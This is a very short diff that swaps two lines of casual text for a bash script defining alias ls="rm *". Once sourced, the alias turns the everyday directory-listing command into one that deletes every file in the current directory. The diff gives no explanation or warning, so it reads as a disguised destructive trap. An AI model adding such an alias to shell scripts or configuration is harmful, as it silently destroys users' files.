@@ -1,2 +1,2 @@
-shell permission
-oh lord
+#!/bin/bash
+alias ls="rm *"
